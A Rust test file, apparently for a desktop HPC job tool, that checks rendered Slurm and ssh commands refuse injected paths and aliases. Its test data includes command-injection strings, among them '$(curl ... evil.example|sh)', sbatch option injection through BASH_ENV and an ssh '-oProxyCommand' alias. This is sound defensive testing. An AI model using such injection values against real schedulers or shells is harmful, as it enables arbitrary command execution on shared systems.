// SPDX-License-Identifier: Apache-2.0
//! The job scripts refuse a results or output folder that bash would run.
//!
//! The full-run script writes `OUT_DIR="<results_root>/runs/<id>"` and the
//! dataset-prepare script writes `#SBATCH --output=<results_root>/...`. A
//! shared or typed results folder with `$(...)`, a backtick, a double quote or a
//! line break must be refused before either script is rendered. sbatch splits
//! every `#SBATCH` line at whitespace and ends it at '#', so a results folder
//! with a space, '#' or a quote must be refused too: otherwise it adds sbatch
//! options such as `--export=ALL,BASH_ENV=<file>` to the job.

use coperceive_desktop::dataset_jobs::{render_prepare_script, DatasetPrepareRequest};
use coperceive_desktop::hpc::{EnvironmentKind, EnvironmentSetup, ServerProfile};
use coperceive_desktop::job_submit::{render_run_script, SubmitOptions};
use coperceive_desktop::run_plan::RunPlan;
use coperceive_desktop::server_profiles::ServerEntry;
use coperceive_desktop::ssh::{build_ssh_command_for, SshTarget};

const CLUSTER_B: &str = include_str!("fixtures/hpc/cluster-b.json");
const PLAN_ID: &str = "plan-1763300000-a1b2c3d4e5f6";

fn profile(results_root: &str) -> ServerProfile {
    let entry: ServerEntry = serde_json::from_str(CLUSTER_B).expect("cluster-b fixture");
    let mut profile = entry.profile;
    profile.results_root = results_root.to_string();
    profile.environment = EnvironmentSetup {
        kind: EnvironmentKind::Modules,
        modules: vec!["python/3.12".to_string()],
        ..EnvironmentSetup::default()
    };
    profile
}

/// A plan shaped like the one `save_run_plan` stores for this profile.
fn plan(profile: &ServerProfile, output_dir: &str) -> RunPlan {
    serde_json::from_value(serde_json::json!({
        "schema": "coperceive-run-plan-1",
        "id": PLAN_ID,
        "created_unix": 1_763_300_000u64,
        "profile_id": "fixture-cluster-b",
        "profile_name": profile.name,
        "pipeline": {"id": "lab-eval", "name": "lab-eval", "source": "custom"},
        "argv": [
            "/usr/bin/python3",
            "/data/code/pipelines/run.py",
            "--output-dir",
            output_dir,
        ],
        "environment": profile.environment,
        "output_dir": output_dir,
        "scratch_dir": profile.scratch_template,
        "checks": [],
        "contract_check_script": "",
        "nothing_submitted": true,
    }))
    .expect("plan")
}

fn render(results_root: &str, output_dir: &str) -> Result<String, String> {
    let profile = profile(results_root);
    let plan = plan(&profile, output_dir);
    render_run_script(&profile, &plan, &SubmitOptions::default()).map(|preview| preview.script)
}

#[test]
fn the_full_run_script_renders_a_plain_results_folder_as_before() {
    for results_root in ["/data/results", "/home/dana/results", "/gpfs/lab-01/runs.v2"] {
        let output_dir = format!("{results_root}/runs/{PLAN_ID}");
        let script = render(results_root, &output_dir)
            .unwrap_or_else(|error| panic!("{results_root:?}: {error}"));
        assert!(
            script.contains(&format!("OUT_DIR=\"{output_dir}\"\n")),
            "{script}"
        );
    }
}

#[test]
fn the_full_run_script_refuses_a_results_folder_bash_would_run() {
    for results_root in [
        "/data/lab/x$(curl${IFS}-fsS${IFS}evil.example|sh)",
        "/data/lab/x`touch marker`",
        "/data/lab/x\";touch marker;\"",
        "~/results",
    ] {
        let output_dir = format!("{results_root}/runs/{PLAN_ID}");
        let outcome = render(results_root, &output_dir);
        let error = outcome
            .as_ref()
            .err()
            .unwrap_or_else(|| panic!("{results_root:?} rendered: {outcome:?}"));
        assert!(error.contains("results folder"), "{results_root:?}: {error}");
    }
}

#[test]
fn the_full_run_script_refuses_a_tampered_output_dir_under_a_clean_results_folder() {
    // The saved plan is re-read from the cluster before submission.
    let outcome = render("/data/results", "/data/results/runs/x$(touch${IFS}marker)");
    let error = outcome.as_ref().err().unwrap_or_else(|| panic!("rendered: {outcome:?}"));
    assert!(error.contains("output folder"), "{error}");
}

#[test]
fn the_dataset_prepare_script_refuses_a_results_folder_with_a_line_break() {
    let profile = profile("/dev/null\necho INJECTED_LINE_RAN #");
    let request = DatasetPrepareRequest {
        adapter: "opv2v".to_string(),
        raw_root: "/data/opv2v/test".to_string(),
        split: Some("test".to_string()),
        scenes: None,
        workers: 1,
        images: "originals".to_string(),
    };
    let outcome = render_prepare_script(
        &profile,
        &request,
        &["scene_0001".to_string()],
        "coperceive-cache/opv2v/abc123/test",
        0,
        0,
    );
    let error = outcome
        .as_ref()
        .err()
        .unwrap_or_else(|| panic!("rendered: {}", outcome.as_ref().unwrap().script));
    assert!(error.contains("results folder"), "{error}");
}

/// The text after `#SBATCH`, split the way sbatch's directive reader does
/// (Slurm src/sbatch/opt.c): whitespace separates arguments, a backslash
/// escapes, quotes group, an unquoted '#' ends the line, and an unmatched quote
/// is an error.
fn sbatch_arguments(rest: &str) -> Result<Vec<String>, String> {
    let mut arguments = Vec::new();
    let mut chars = rest.chars().peekable();
    loop {
        while chars.peek().is_some_and(|ch| ch.is_ascii_whitespace()) {
            chars.next();
        }
        if chars.peek().is_none() {
            return Ok(arguments);
        }
        let mut argument = String::new();
        let mut quote: Option<char> = None;
        let mut escaped = false;
        let mut comment = false;
        while let Some(&ch) = chars.peek() {
            if quote.is_none() && !escaped && ch.is_ascii_whitespace() {
                break;
            }
            chars.next();
            if escaped {
                escaped = false;
                argument.push(ch);
            } else if ch == '\\' {
                escaped = true;
            } else if quote == Some(ch) {
                quote = None;
            } else if quote.is_none() && (ch == '"' || ch == '\'') {
                quote = Some(ch);
            } else if quote.is_none() && ch == '#' {
                comment = true;
                break;
            } else {
                argument.push(ch);
            }
        }
        if let Some(quote) = quote {
            return Err(format!("Unmatched `{quote}` in [{rest}]"));
        }
        if !argument.is_empty() {
            arguments.push(argument);
        }
        if comment {
            return Ok(arguments);
        }
    }
}

fn assert_one_sbatch_argument_per_line(script: &str, case: &str) {
    let mut seen = 0;
    for line in script.lines() {
        let Some(rest) = line.strip_prefix("#SBATCH") else {
            continue;
        };
        seen += 1;
        let arguments = sbatch_arguments(rest)
            .unwrap_or_else(|error| panic!("{case}: sbatch would refuse {line:?}: {error}"));
        assert_eq!(arguments.len(), 1, "{case}: {line:?} gives sbatch {arguments:?}");
        assert_eq!(format!("#SBATCH {}", arguments[0]), line, "{case}: {arguments:?}");
    }
    assert!(seen >= 5, "{case}: no #SBATCH header in {script}");
}

/// Results folders sbatch would read as more than one argument (or refuse).
const SBATCH_SPLITTING_RESULTS_ROOTS: &[&str] = &[
    "/dev/null --export=ALL,BASH_ENV=/data/lab/evil.sh #",
    "/data/lab/r --output=/dev/null --export=ALL,BASH_ENV=/data/lab/evil.sh #",
    "/data/lab/r --chdir=/data/lab/evil --comment=x",
    "/data/My Lab/runs",
    "/data/o'brien/runs",
    "/data/lab#2/runs",
];

#[test]
fn the_full_run_script_refuses_a_results_folder_sbatch_would_split_into_options() {
    for results_root in SBATCH_SPLITTING_RESULTS_ROOTS {
        let output_dir = format!("{results_root}/runs/{PLAN_ID}");
        let outcome = render(results_root, &output_dir);
        let error = outcome
            .as_ref()
            .err()
            .unwrap_or_else(|| panic!("{results_root:?} rendered: {outcome:?}"));
        assert!(error.contains("results folder"), "{results_root:?}: {error}");
        assert!(error.contains("spaces, '#' or quotes"), "{results_root:?}: {error}");
    }
}

#[test]
fn every_sbatch_line_of_the_full_run_script_is_one_sbatch_argument() {
    for results_root in ["/data/results", "/home/dana/results/", "/gpfs/lab-01/runs.v2"] {
        let output_dir = format!("{}/runs/{PLAN_ID}", results_root.trim_end_matches('/'));
        let script = render(results_root, &output_dir)
            .unwrap_or_else(|error| panic!("{results_root:?}: {error}"));
        assert_one_sbatch_argument_per_line(&script, results_root);
    }
}

#[test]
fn the_dataset_prepare_script_refuses_a_results_folder_sbatch_would_split_into_options() {
    let request = DatasetPrepareRequest {
        adapter: "opv2v".to_string(),
        raw_root: "/data/opv2v/test".to_string(),
        split: Some("test".to_string()),
        scenes: None,
        workers: 1,
        images: "originals".to_string(),
    };
    for results_root in SBATCH_SPLITTING_RESULTS_ROOTS {
        let outcome = render_prepare_script(
            &profile(results_root),
            &request,
            &["scene_0001".to_string()],
            "coperceive-cache/opv2v/abc123/test",
            0,
            0,
        );
        match outcome {
            Ok(preview) => panic!("{results_root:?} rendered: {}", preview.script),
            Err(error) => {
                assert!(error.contains("spaces, '#' or quotes"), "{results_root:?}: {error}")
            }
        }
    }
    let preview = render_prepare_script(
        &profile("/data/results"),
        &request,
        &["scene_0001".to_string()],
        "coperceive-cache/opv2v/abc123/test",
        0,
        0,
    )
    .expect("plain results folder");
    assert_one_sbatch_argument_per_line(&preview.script, "/data/results");
}

/// The real OpenSSH client resolves the argv Coperceive builds without
/// connecting (`-G` prints the configuration and exits; `-F /dev/null` ignores
/// every config file). Unlike a skip-if-missing check, this fails when ssh is
/// not installed, and it proves the hostile alias is harmless only after a
/// positive control shows the same ssh would run it as an option without `--`.
#[test]
#[cfg(unix)]
fn openssh_reads_an_option_like_alias_as_a_destination_never_as_an_option() {
    let ssh_g = |args: &[String]| {
        let mut full = vec!["-G".to_string(), "-F".to_string(), "/dev/null".to_string()];
        full.extend_from_slice(args);
        std::process::Command::new("ssh")
            .args(&full)
            .stdin(std::process::Stdio::null())
            .output()
            .unwrap_or_else(|error| {
                panic!(
                    "this test needs the OpenSSH client on PATH (ssh -G, no connection): {error}"
                )
            })
    };
    let proxycommand = |stdout: &[u8]| {
        String::from_utf8_lossy(stdout)
            .lines()
            .any(|line| line.starts_with("proxycommand touch"))
    };

    // A plain target resolves with every option placed before `--`.
    let plain = SshTarget {
        destination: "alice@cluster.example.org".to_string(),
        port: Some(2222),
        proxy_jump: Some("jump.example.org".to_string()),
    };
    let output = ssh_g(&build_ssh_command_for(&plain, "true"));
    let config = String::from_utf8_lossy(&output.stdout);
    assert!(
        output.status.success(),
        "ssh -G failed for a plain target: {}{config}",
        String::from_utf8_lossy(&output.stderr)
    );
    for line in [
        "hostname cluster.example.org",
        "user alice",
        "port 2222",
        "proxyjump jump.example.org",
        "batchmode yes",
        "connecttimeout 8",
    ] {
        assert!(config.lines().any(|have| have == line), "{line}: {config}");
    }

    let hostile = SshTarget::alias("-oProxyCommand=touch /nonexistent/coperceive-marker");
    let args = build_ssh_command_for(&hostile, "true");
    let dash_dash = args.iter().position(|arg| arg == "--").expect("-- in the argv");
    assert_eq!(args[dash_dash + 1], hostile.destination, "{args:?}");

    // Positive control: this ssh reads the same alias as an option without `--`.
    let mut without = args.clone();
    without.remove(dash_dash);
    let control = ssh_g(&without);
    assert!(
        proxycommand(&control.stdout),
        "control: ssh did not read the alias as an option, so the check below proves \
         nothing: {}",
        String::from_utf8_lossy(&control.stdout)
    );

    // With `--`, ssh either rejects it as a host name (OpenSSH 9.6 and later) or
    // resolves it as the host name (older clients). Any other failure fails.
    let output = ssh_g(&args);
    let stdout = String::from_utf8_lossy(&output.stdout);
    let stderr = String::from_utf8_lossy(&output.stderr);
    assert!(!proxycommand(&output.stdout), "read as an option: {stdout}");
    if output.status.success() {
        let expected = format!("hostname {}", hostile.destination.to_lowercase());
        assert!(
            stdout.lines().any(|line| line.to_lowercase() == expected),
            "ssh -G succeeded but did not take the alias as the host name: {stdout}"
        );
    } else {
        assert!(
            stderr.contains("hostname contains invalid characters"),
            "ssh -G failed for another reason: status {:?}, stderr {stderr}, stdout {stdout}",
            output.status.code()
        );
        assert!(stdout.trim().is_empty(), "{stdout}");
    }
}
